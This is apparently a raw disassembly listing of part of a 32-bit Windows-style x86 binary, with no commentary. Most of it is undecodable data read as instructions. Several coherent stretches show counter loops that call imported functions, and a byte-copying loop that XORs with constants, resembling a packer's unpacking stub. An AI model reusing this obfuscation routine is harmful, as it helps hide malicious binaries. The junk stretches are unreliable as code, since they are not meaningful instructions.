  40f31d:	lods   eax,DWORD PTR ds:[esi]
  40f31e:	mov    esi,0x54d23450
  40f323:	sub    DWORD PTR [eax-0xf],esp
  40f326:	leave  
  40f327:	jnp    0x40f32a
  40f329:	fsub   DWORD PTR [esi+0x4e]
  40f32c:	mov    ecx,0xc922ee73
  40f331:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f332:	sub    esi,DWORD PTR [esi]
  40f334:	pop    ds
  40f335:	inc    edi
  40f336:	dec    edi
  40f337:	or     BYTE PTR [ebx],al
  40f339:	mov    bh,0x2b
  40f33b:	in     al,dx
  40f33c:	pop    es
  40f33d:	xor    al,0x84
  40f33f:	ret    0xc67
  40f342:	out    0x8e,al
  40f344:	jns    0x40f397
  40f346:	ins    BYTE PTR es:[edi],dx
  40f347:	xor    ebx,DWORD PTR [edx-0x20]
  40f34a:	in     al,dx
  40f34b:	int    0xb9
  40f34d:	inc    esi
  40f34e:	pop    esi
  40f34f:	mov    ch,dh
  40f351:	pop    ds
  40f352:	in     al,dx
  40f353:	xor    BYTE PTR [edx],cl
  40f355:	jg     0x40f38a
  40f357:	shr    DWORD PTR [esi-0x1805cacc],cl
  40f35d:	retf   
  40f35e:	cmp    cl,ah
  40f360:	mov    esi,0xcef0534e
  40f365:	outs   dx,DWORD PTR ds:[esi]
  40f366:	sbb    bl,al
  40f368:	xchg   ebp,eax
  40f369:	stos   BYTE PTR es:[edi],al
  40f36a:	mov    eax,ds:0x835b7654
  40f36f:	mov    dl,0x7c
  40f371:	rcr    BYTE PTR [edx+0x4c772dd],0xbe
  40f378:	addr16 test al,0xd3
  40f37b:	mov    ebx,0x1618d825
  40f380:	enter  0xb8fe,0x31
  40f384:	test   DWORD PTR [eax+edi*8+0x37a72581],ebx
  40f38b:	inc    ebx
  40f38c:	add    BYTE PTR [eax],al
  40f38e:	add    BYTE PTR [eax],al
  40f390:	add    BYTE PTR [ebx],dh
  40f392:	leave  
  40f393:	xor    ecx,DWORD PTR ds:0x4337a7
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x4337a7,ecx
  40f3a0:	cmp    DWORD PTR ds:0x4337a7,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x4337a7,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x4337a7
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x4337a7,ecx
  40f3d0:	cmp    DWORD PTR ds:0x4337a7,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x4336ab
  40f3e3:	mov    ecx,DWORD PTR ds:0x433783
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x4336d7,0x13
  40f3fb:	cmp    DWORD PTR ds:0x4336d7,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x4336d7,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x4336d7
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x4336d7,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x43376f,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x43376f
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x43376f,ecx
  40f444:	cmp    DWORD PTR ds:0x43376f,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x43376f,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x43376f
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x43376f,ecx
  40f474:	cmp    DWORD PTR ds:0x43376f,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x43375b,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x43375b
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x43375b,edx
  40f498:	cmp    DWORD PTR ds:0x43375b,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433911
  40f4af:	push   0x433967
  40f4b4:	push   0x43394b
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x43375b,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433797
  40f4d2:	adc    DWORD PTR ds:0x4337a7,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax+0x73cf1339]
  40f540:	loop   0x40f516
  40f542:	lods   al,BYTE PTR ds:[esi]
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	jle    0x40f505
  40f54b:	rcl    BYTE PTR [ebp+0x5f],0x2e
  40f54f:	test   DWORD PTR [ebp-0x4706d042],esp
  40f555:	stos   DWORD PTR es:[edi],eax
  40f556:	enter  0x4de0,0xf0
  40f55a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f55b:	pop    ds
  40f55c:	test   eax,0x594c8e49
  40f561:	(bad)  
  40f562:	nop
  40f563:	imul   ebx,DWORD PTR [ebp-0x100ef554],0x7e
  40f56a:	add    DWORD PTR [edx],eax
  40f56c:	aaa    
  40f56d:	and    BYTE PTR [edi+0x7dd571fc],0x6e
  40f574:	aas    
  40f575:	dec    edx
  40f576:	adc    ebx,ebp
  40f578:	ins    BYTE PTR es:[edi],dx
  40f579:	rcr    BYTE PTR [edi+0x69babb5a],cl
  40f57f:	lock sub eax,0xef68ed6c
  40f585:	sub    BYTE PTR [ecx],cl
  40f587:	mov    ss,WORD PTR [esi+0x7]
  40f58a:	sub    esp,DWORD PTR [ecx]
  40f58c:	push   eax
  40f58d:	cli    
  40f58e:	into   
  40f58f:	push   0x81b8a08b
  40f594:	lahf   
  40f595:	jo     0x40f5ff
  40f597:	retf   
  40f598:	cld    
  40f599:	stos   DWORD PTR es:[edi],eax
  40f59a:	adc    eax,0xf9c6b4d3
  40f59f:	jmp    0x7e8d:0xdb72578e
  40f5a6:	sti    
  40f5a7:	(bad)  
  40f5a8:	mov    ah,0xd4
  40f5aa:	fwait
  40f5ab:	loop   0x40f541
  40f5ad:	add    edi,DWORD PTR es:[edi+0x454f99bb]
  40f5b4:	ror    DWORD PTR ds:0x71e5,cl
  40f5b9:	aaa    
  40f5ba:	xor    ch,ah
  40f5bc:	sbb    eax,0x82befd8c
  40f5c1:	dec    edi
  40f5c2:	xor    eax,0x922029ff
  40f5c7:	push   eax
  40f5c8:	adc    eax,0x761e0067
  40f5cd:	out    0xa0,eax
  40f5cf:	jp     0x40f585
  40f5d1:	imul   edi,esi,0xfffffffd
  40f5d4:	in     al,dx
  40f5d5:	push   es
  40f5d6:	sub    bh,BYTE PTR [eax-0x653044e1]
  40f5dc:	sub    BYTE PTR [edx],cl
  40f5de:	xor    bh,BYTE PTR [ebx]
  40f5e0:	or     DWORD PTR [ecx],esi
  40f5e2:	sbb    ah,BYTE PTR [eax+0x5252b4d4]
  40f5e8:	push   esi
  40f5e9:	ss aaa 
  40f5eb:	sar    BYTE PTR [ebx+0x79],1
  40f5ee:	dec    ebx
  40f5ef:	fistp  DWORD PTR [si]
  40f5f2:	div    BYTE PTR [edi]
  40f5f4:	sbb    bh,bh
  40f5f6:	and    ah,bl
  40f5f8:	sbb    edx,DWORD PTR [eax]
  40f5fa:	jns    0x40f5cc
  40f5fc:	or     eax,0x592c060b
  40f601:	ror    bh,1
  40f603:	xchg   ebx,eax
  40f604:	mov    al,BYTE PTR [edx+eiz*8-0x77]
  40f608:	or     ah,BYTE PTR [edi+0x78379e5a]
  40f60e:	std    
  40f60f:	or     BYTE PTR [esi*2-0x57053794],0xa1
  40f617:	in     al,dx
  40f618:	xor    eax,0x7766e701
  40f61d:	(bad)  
  40f61e:	fst    QWORD PTR [edi+0x2a]
  40f621:	sub    eax,0x32694eb
  40f626:	stc    
  40f627:	push   edx
  40f628:	add    eax,0xffac6185
  40f62d:	cmp    BYTE PTR [edi+0x7ba462b8],cl
  40f633:	mov    dh,0xcd
  40f635:	imul   edi
  40f637:	repz ss mov ch,0x63
  40f63b:	mov    WORD PTR [ebx],ss
  40f63d:	push   0x50320fe4
  40f642:	test   al,0x7f
  40f644:	add    al,ah
  40f646:	sub    ah,ah
  40f648:	mov    ebp,0x75c0e8fe
  40f64d:	pop    ecx
  40f64e:	(bad)  
  40f64f:	push   esp
  40f650:	lds    ebx,FWORD PTR [esi-0x20]
  40f653:	inc    esi
  40f654:	xchg   edx,edx
  40f656:	pushw  0x9dc4
  40f65a:	cmp    DWORD PTR [ecx+0x434857bc],0xa7d2a0
  40f664:	or     eax,0x755e9651
  40f669:	push   esi
  40f66a:	loop   0x40f62c
  40f66c:	mov    dl,0x30
  40f66e:	lods   al,BYTE PTR ds:[esi]
  40f66f:	sbb    ah,dl
  40f671:	dec    esp
  40f672:	sar    BYTE PTR [eax+edi*1-0x2e8288a1],0xae
  40f67a:	jne    0x40f677
  40f67c:	cmp    bl,0xad
  40f67f:	fisttp QWORD PTR [ebp+0x6b]
  40f682:	nop
  40f683:	dec    edx
  40f684:	jl     0x40f611
  40f686:	xchg   edi,eax
  40f687:	mov    ch,0x63
  40f689:	mov    ebp,0x2c308d9d
  40f68e:	out    dx,al
  40f68f:	xchg   ebp,eax
  40f690:	and    BYTE PTR [edx],0x4c
  40f693:	pop    ebp
  40f694:	jnp    0x40f6b5
  40f696:	sbb    al,0x6d
  40f698:	or     edx,esi
  40f69a:	psubd  mm7,QWORD PTR [eax+ebp*2-0x3d210f1b]
  40f6a2:	mov    es,WORD PTR [edx-0x2a97686b]
  40f6a8:	pop    eax
  40f6a9:	and    BYTE PTR [edi+edi*4],al
  40f6ac:	scas   al,BYTE PTR es:[edi]
  40f6ad:	push   esp
  40f6ae:	inc    dl
  40f6b0:	mov    dl,0x45
  40f6b2:	and    DWORD PTR [eax-0x63],ecx
  40f6b5:	pop    ecx
  40f6b6:	sub    bh,BYTE PTR [edx+eax*4-0x2712fe91]
  40f6bd:	jbe    0x40f721
  40f6bf:	fnstsw ax
  40f6c1:	mov    cs,WORD PTR [ebx+0x6e]
  40f6c4:	ficom  DWORD PTR [edx-0x47]
  40f6c7:	sti    
  40f6c8:	cmp    edi,edx
  40f6ca:	sahf   
  40f6cb:	add    al,0xe3
  40f6cd:	xchg   edx,eax
  40f6ce:	or     al,0x7a
  40f6d0:	sub    eax,0xe8c3a7b2
  40f6d5:	mov    esi,0xd25806d9
  40f6da:	sbb    eax,0x5acd8514
  40f6df:	add    DWORD PTR [eax-0x46],ebx
  40f6e2:	push   cs
  40f6e3:	push   ds
  40f6e4:	addr16 retf 
  40f6e6:	add    eax,0xcbaad1fc
  40f6eb:	mov    edi,0xea4e48f
  40f6f0:	cmp    BYTE PTR [ecx-0x1b9cb46d],ch
  40f6f6:	pop    esp
  40f6f7:	test   al,0x84
  40f6f9:	hlt    
  40f6fa:	or     eax,0xfe33fd70
  40f6ff:	pop    esp
  40f700:	gs mov esp,0xb071c001
  40f706:	xchg   edi,eax
  40f707:	mov    cl,0x8
  40f709:	rcr    DWORD PTR ds:0x3bbbee84,cl
  40f70f:	pop    edx
  40f710:	das    
  40f711:	push   ss
  40f712:	or     bh,BYTE PTR [esi+0x3c592a9c]
  40f718:	imul   esi,DWORD PTR [eax+ecx*2-0x17],0xf893ac3a
  40f720:	in     al,dx
  40f721:	ins    DWORD PTR es:[edi],dx
  40f722:	xchg   esp,eax
  40f723:	mov    dl,0x51
  40f725:	adc    BYTE PTR es:[edi+edi*2],dl
  40f729:	push   ss
  40f72a:	or     DWORD PTR [edx+ebp*8+0x74821e16],0x74260c7f
  40f735:	push   ebx
  40f736:	in     eax,0x9a
  40f738:	push   ds
  40f739:	(bad)  
  40f73a:	ins    BYTE PTR es:[edi],dx
  40f73b:	loop   0x40f766
  40f73d:	(bad)  
  40f73e:	jle    0x40f75e
  40f740:	cdq    
  40f741:	inc    ecx
  40f742:	retf   
  40f743:	jp     0x40f74a
  40f745:	retf   
  40f746:	adc    eax,0xa3664e68
  40f74b:	xor    esi,DWORD PTR gs:[edx-0x4f]
  40f74f:	mov    eax,0xea739974
  40f754:	mov    ecx,edi
  40f756:	mov    dl,0x4d
  40f758:	mov    esp,DWORD PTR [eax-0xb]
  40f75b:	xor    al,0x11
  40f75d:	(bad)  
  40f75e:	stos   BYTE PTR es:[edi],al
  40f75f:	mov    bl,0x9f
  40f761:	adc    BYTE PTR [ecx+0x5b],cl
  40f764:	test   cl,bh
  40f766:	xchg   BYTE PTR [esi+0x3de89d15],ah
  40f76c:	repnz popf 
  40f76e:	xor    edi,DWORD PTR [ebp+0x66]
  40f771:	and    ebp,DWORD PTR [edx-0x1ff793d1]
  40f777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f778:	xchg   ecx,esp
  40f77a:	test   DWORD PTR [eax],eax
  40f77c:	les    ecx,FWORD PTR [ebp+0x7]
  40f77f:	push   ebp
  40f780:	aad    0x35
  40f782:	adc    BYTE PTR [esi-0x32],dh
  40f785:	loope  0x40f796
  40f787:	jecxz  0x40f78f
  40f789:	cmp    ah,ch
  40f78b:	mov    esi,0x67137fd1
  40f790:	cwde   
  40f791:	clc    
  40f792:	in     eax,0x80
  40f794:	lock jnp 0x40f811
  40f797:	ja     0x40f78c
  40f799:	call   0x8a8f:0x76edc9f1
  40f7a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7a1:	mov    eax,DWORD PTR ds:0xfa7b0640
  40f7a7:	mov    BYTE PTR [edx-0x531687f4],al
  40f7ad:	stc    
  40f7ae:	xchg   edi,eax
  40f7af:	clc    
  40f7b0:	call   0x2056ede3
  40f7b5:	rcl    DWORD PTR [eax-0x5e7a508b],0xac
  40f7bc:	jmp    0x7ee3:0x79a360d6
  40f7c3:	inc    edi
  40f7c4:	xchg   ecx,eax
  40f7c5:	lock cmp BYTE PTR [ecx],cl
  40f7c8:	div    DWORD PTR [ecx-0x4d]
  40f7cb:	cmc    
  40f7cc:	retf   
  40f7cd:	shl    DWORD PTR [edx+0x12],cl
  40f7d0:	fmul   QWORD PTR [ebp+0x37]
  40f7d3:	(bad)  
  40f7d4:	(bad)  
  40f7d6:	test   cl,0x4d
  40f7d9:	adc    ecx,esi
  40f7db:	pop    esi
  40f7dc:	push   es
  40f7dd:	cmp    ebp,ebx
  40f7df:	aad    0x91
  40f7e1:	pushf  
  40f7e2:	imul   esp,DWORD PTR [edx],0x13
  40f7e5:	add    ah,dh
  40f7e7:	xor    bh,BYTE PTR [edx+0x71]
  40f7ea:	adc    DWORD PTR [ebx+edi*4],eax
  40f7ed:	xchg   edi,eax
  40f7ee:	xchg   ecx,eax
  40f7ef:	add    eax,0x69fd62f
  40f7f4:	inc    esi
  40f7f5:	rol    bh,cl
  40f7f7:	xor    al,0x9e
  40f7f9:	ins    BYTE PTR es:[edi],dx
  40f7fa:	xlat   BYTE PTR ds:[ebx]
  40f7fb:	inc    esi
  40f7fc:	mov    bl,0x3b
  40f7fe:	sub    BYTE PTR [eax-0x3e],cl
  40f801:	hlt    
  40f802:	scas   eax,DWORD PTR es:[edi]
  40f803:	cmc    
  40f804:	inc    ebp
  40f805:	xor    esi,edi
  40f807:	jl     0x40f879
  40f809:	int3   
  40f80a:	cld    
  40f80b:	stc    
  40f80c:	mov    eax,ds:0x38dac922
  40f811:	or     eax,0x14a7974f
  40f816:	rcl    ebp,0x96
  40f819:	ds loopne 0x40f803
  40f81c:	inc    edi
  40f81d:	out    0xfd,eax
  40f81f:	add    esp,eax
  40f821:	push   eax
  40f822:	cs mov ecx,0x2faec78e
  40f828:	jmp    0x165027c3
  40f82d:	lods   al,BYTE PTR ds:[esi]
  40f82e:	jp     0x40f7df
  40f830:	pop    ecx
  40f831:	push   0xd873db0f
  40f836:	jmp    0x9583:0x25dd4f87
  40f83d:	scas   al,BYTE PTR es:[edi]
  40f83e:	pop    ebx
  40f83f:	jb     0x40f7ff
  40f841:	scas   al,BYTE PTR es:[edi]
  40f842:	sub    bl,bh
  40f844:	out    dx,al
  40f845:	or     ch,BYTE PTR [edx]
  40f847:	(bad)  
  40f848:	sbb    esp,DWORD PTR [eax]
  40f84a:	pushf  
  40f84b:	xor    edi,ecx
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0xc183003f
  40f897:	jnp    0x40f86b
  40f899:	stos   DWORD PTR es:[edi],eax
  40f89a:	jle    0x40f91a
  40f89c:	jl     0x40f91b
  40f89e:	jle    0x40f91e
  40f8a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8a1:	inc    edx
  40f8a2:	fcomp  DWORD PTR [ecx]
  40f8a4:	or     dh,BYTE PTR [esi-0x699ed9f4]
  40f8aa:	call   0x773e406
  40f8af:	fcom   DWORD PTR [eax-0x33]
  40f8b2:	fucomip st,st(0)
  40f8b4:	mov    eax,0x3fca30d3
  40f8b9:	das    
  40f8ba:	jmp    0x40f8bb
  40f8bc:	lahf   
  40f8bd:	and    edi,DWORD PTR [esp+eiz*4+0x3]
  40f8c1:	xchg   esi,eax
  40f8c2:	and    eax,0x89b64a97
  40f8c7:	jp     0x40f8c2
  40f8c9:	hlt    
  40f8ca:	mov    ah,0xfa
  40f8cc:	cmp    ebp,ecx
  40f8ce:	cmp    dh,BYTE PTR [ebp+esi*8+0x45]
  40f8d2:	and    ch,BYTE PTR [esi-0x55]
  40f8d5:	fisubr DWORD PTR [esi-0x5efa5643]
  40f8db:	push   ebp
  40f8dc:	dec    ebp
  40f8dd:	addr16 aaa 
  40f8df:	sbb    DWORD PTR ds:0x680eaead,edx
  40f8e5:	add    DWORD PTR [ecx+0x143e70fc],0xab0cfbbb
  40f8ef:	lds    ecx,FWORD PTR [eax+0x1ce9d3db]
  40f8f5:	test   eax,0x2649fa9f
  40f8fa:	pop    esp
  40f8fb:	mov    ds:0x77a30471,eax
  40f900:	sbb    eax,0x6e803e58
  40f905:	popf   
  40f906:	test   eax,0x7057eb61
  40f90b:	add    DWORD PTR [eax+0x14],edx
  40f90e:	pop    ss
  40f90f:	enter  0x61b,0x74
  40f913:	cmp    bl,bl
  40f915:	data16 lods al,BYTE PTR ds:[esi]
  40f917:	int    0x2c
  40f919:	xor    al,0x4f
  40f91b:	jmp    0xd3b2c886
  40f920:	in     eax,dx
  40f921:	jae    0x40f8d4
  40f923:	stos   DWORD PTR es:[edi],eax
  40f924:	and    edx,DWORD PTR [ebp-0x38]
  40f927:	mov    ch,bh
  40f929:	lods   eax,DWORD PTR ds:[esi]
  40f92a:	scas   eax,DWORD PTR es:[edi]
  40f92b:	mov    ebx,0xd38073af
  40f930:	mov    dh,0x51
  40f932:	(bad)  
  40f934:	test   al,0x74
  40f936:	outs   dx,BYTE PTR ds:[esi]
  40f937:	mov    dl,0xaa
  40f939:	dec    eax
  40f93a:	cs mov dl,0xb4
  40f93d:	shl    edx,1
  40f93f:	or     ebx,DWORD PTR [ebx+0x35]
  40f942:	push   edi
  40f943:	icebp  
  40f944:	out    0x63,eax
  40f946:	mov    dl,bl
  40f948:	cmp    eax,0xf8d79ab7
  40f94d:	dec    eax
  40f94e:	mov    al,BYTE PTR [edx+0xc]
  40f951:	loop   0x40f946
  40f953:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f954:	idiv   edi
  40f956:	push   eax
  40f957:	xchg   ebx,eax
  40f958:	mov    gs,edx
  40f95a:	xor    eax,0x6ec661ae
  40f95f:	fldenv [edi+edi*1-0x4ccd18ff]
  40f966:	pushf  
  40f967:	popa   
  40f968:	dec    esp
  40f969:	or     ah,dl
  40f96b:	mov    bl,BYTE PTR [eax-0x31]
  40f96e:	test   BYTE PTR [ebx-0x3bf451ac],0xde
  40f975:	daa    
  40f976:	mov    eax,ds:0x37b7e8ba
  40f97b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f97c:	add    eax,0x81396d66
  40f981:	int    0x18
  40f983:	jae    0x40f9e5
  40f985:	add    al,0x4b
  40f987:	cmp    dh,BYTE PTR [eax]
  40f989:	sbb    eax,0xeb4a4743
  40f98e:	int3   
  40f98f:	mov    cl,0x96
  40f991:	jne    0x40f93a
  40f993:	and    al,0xf0
  40f995:	test   BYTE PTR [eax-0x1],ah
  40f998:	sub    BYTE PTR [ecx+0x63],dh
  40f99b:	in     eax,dx
  40f99c:	aad    0x92
  40f99e:	jg     0x40f972
  40f9a0:	aad    0xee
  40f9a2:	dec    esp
  40f9a3:	jns    0x40f935
  40f9a5:	adc    ebx,DWORD PTR [eax+0x34]
  40f9a8:	test   al,0xfe
  40f9aa:	pop    eax
  40f9ab:	mov    esp,0x36c0954d
  40f9b0:	ins    BYTE PTR es:[edi],dx
  40f9b1:	lock mov edi,0xc1956725
  40f9b7:	mov    ah,0x30
  40f9b9:	iret   
  40f9ba:	ror    edi,cl
  40f9bc:	into   
  40f9bd:	rcr    BYTE PTR [ecx+0x5c],0xc8
  40f9c1:	pop    ebp
  40f9c2:	push   edx
  40f9c3:	mov    al,0x2e
  40f9c5:	or     ebp,DWORD PTR [esi-0x7e]
  40f9c8:	outs   dx,DWORD PTR ds:[esi]
  40f9c9:	xor    al,0x0
  40f9cb:	ret    0xff7
  40f9ce:	push   ss
  40f9cf:	das    
  40f9d0:	cli    
  40f9d1:	add    al,0x5b
  40f9d3:	mov    ds:0xe1c53268,eax
  40f9d8:	jle    0x40f9dc
  40f9da:	pop    eax
  40f9db:	in     al,0xbd
  40f9dd:	pop    ebx
  40f9de:	cld    
  40f9df:	leave  
  40f9e0:	mov    ecx,0xd37fa1a1
  40f9e5:	shr    BYTE PTR [ecx],cl
  40f9e7:	test   al,0xbc
  40f9e9:	ja     0x40f987
  40f9eb:	js     0x40f9b7
  40f9ed:	or     dh,BYTE PTR [eax+eax*1+0x6e]
  40f9f1:	pop    ebx
  40f9f2:	mov    eax,ds:0x67545297
  40f9f7:	dec    edx
  40f9f8:	minps  xmm3,XMMWORD PTR [edi-0x36]
  40f9fc:	mov    ecx,0xcb5b4a1e
  40fa01:	xchg   ebp,eax
  40fa02:	sbb    edx,DWORD PTR [ebp+0x23]
  40fa05:	xchg   edx,eax
  40fa06:	fwait
  40fa07:	sub    edi,ebx
  40fa09:	sbb    eax,DWORD PTR [edx-0x3f3d8907]
  40fa0f:	lods   al,BYTE PTR ds:[esi]
  40fa10:	mov    edx,0x9f363918
  40fa15:	cmp    BYTE PTR [edi-0x65d1d178],0x53
  40fa1c:	pop    edx
  40fa1d:	cmp    esi,DWORD PTR [ebx+0x513f217c]
  40fa23:	pop    esp
  40fa24:	sub    eax,0x7be92f28
  40fa29:	loop   0x40fa7e
  40fa2b:	inc    ebp
  40fa2c:	jmp    0x7636:0xe869f496
  40fa33:	adc    BYTE PTR [edx-0x4d],dl
  40fa36:	mov    ch,0xcd
  40fa38:	popa   
  40fa39:	pusha  
  40fa3a:	pop    eax
  40fa3b:	iret   
  40fa3c:	jb     0x40f9e3
  40fa3e:	or     eax,0xbdc9615f
  40fa43:	or     bl,cl
  40fa45:	jb     0x40f9d7
  40fa47:	xor    esp,esi
  40fa49:	sub    eax,0x6a56c095
  40fa4e:	rol    BYTE PTR [ebx+0x7c],1
  40fa51:	popa   
  40fa52:	sub    ah,BYTE PTR ds:0x9f92818c
  40fa58:	mov    cl,0x9f
  40fa5a:	sbb    BYTE PTR [edi-0x42d1471d],bl
  40fa60:	scas   eax,DWORD PTR es:[edi]
  40fa61:	jp     0x40fa56
  40fa63:	push   DWORD PTR [ebp+0x6d9e7bd2]
  40fa69:	loopne 0x40fa12
  40fa6b:	mov    ebx,esi
  40fa6d:	push   eax
  40fa6e:	out    0xb1,al
  40fa70:	sbb    eax,0x34d3dc54
  40fa75:	vmwrite edi,DWORD PTR [ebx-0x10c5b666]
  40fa7c:	ins    BYTE PTR es:[edi],dx
  40fa7d:	sbb    DWORD PTR [ebp+ebp*4-0x7430069c],edi
  40fa84:	mov    ds:0x8715886f,eax
  40fa89:	inc    eax
  40fa8a:	js     0x40faa1
  40fa8c:	fstp   QWORD PTR [eax+0x4d]
  40fa8f:	pusha  
  40fa90:	enter  0x143f,0x49
  40fa94:	dec    ebp
  40fa95:	mov    BYTE PTR [esi+0x5b],al
  40fa98:	imul   ecx,DWORD PTR [esi+0x53a49ac9],0xfffffffe
  40fa9f:	das    
  40faa0:	outs   dx,BYTE PTR ds:[esi]
  40faa1:	mov    ah,0x47
  40faa3:	das    
  40faa4:	add    ecx,DWORD PTR [esi+0x9c0e3bf]
  40faaa:	mov    esp,0x2ed2bf68
  40faaf:	push   esi
  40fab0:	dec    esp
  40fab1:	dec    ebx
  40fab2:	cmc    
  40fab3:	cmp    al,0xa
  40fab5:	int3   
  40fab6:	xchg   esp,eax
  40fab7:	add    BYTE PTR [edi+0x5e70345a],bh
  40fabd:	aas    
  40fabe:	or     BYTE PTR [edi],ch
  40fac0:	ss inc edi
  40fac2:	iret   
  40fac3:	lahf   
  40fac4:	mov    bl,0xac
  40fac6:	xchg   edx,eax
  40fac7:	jno    0x40fa55
  40fac9:	fwait
  40faca:	add    ah,BYTE PTR gs:[ebx-0x2a4a14b8]
  40fad1:	pop    es
  40fad2:	fisttp WORD PTR [ebp-0x62]
  40fad5:	mov    BYTE PTR [ebx-0x56b3ff8b],bl
  40fadb:	scas   eax,DWORD PTR es:[edi]
  40fadc:	cli    
  40fadd:	fld    QWORD PTR [esi]
  40fadf:	in     eax,dx
  40fae0:	push   esi
  40fae1:	cmp    DWORD PTR [ecx],ebp
  40fae3:	adc    DWORD PTR [ecx],edx
  40fae5:	ror    BYTE PTR [ebx],cl
  40fae7:	pop    ds
  40fae8:	shr    ecx,1
  40faea:	inc    edi
  40faeb:	pop    es
  40faec:	add    bl,bl
  40faee:	mov    cl,0xb2
  40faf0:	loop   0x40fb64
  40faf2:	sub    BYTE PTR ss:[edi+0x2f],dh
  40faf6:	ror    DWORD PTR [ebx+0x36b5ec36],1
  40fafc:	mov    esi,0xbb5bc1c2
  40fb01:	imul   edi,DWORD PTR [eax+eiz*8],0xe66e8073
  40fb08:	xlat   BYTE PTR ds:[ebx]
  40fb09:	adc    ebp,DWORD PTR [ebp-0x24]
  40fb0c:	mov    ecx,0x35c5c83b
  40fb11:	xchg   esi,eax
  40fb12:	mov    eax,0x300caa4f
  40fb17:	add    BYTE PTR [ebx],dl
  40fb19:	std    
  40fb1a:	lahf   
  40fb1b:	xor    al,0x44
  40fb1d:	or     dl,dl
  40fb1f:	push   eax
  40fb20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb21:	test   DWORD PTR [edx+ebp*4+0x37],edx
  40fb25:	ja     0x40fb63
  40fb27:	dec    edi
  40fb28:	xor    DWORD PTR ds:0x2176f7a1,edx
  40fb2e:	jae    0x40fb61
  40fb30:	(bad)  
  40fb31:	xchg   edi,eax
  40fb32:	rcl    DWORD PTR [esi-0x34e479f],1
  40fb38:	test   eax,0xf263cc84
  40fb3d:	dec    esi
  40fb3e:	sub    ebx,DWORD PTR [ebx]
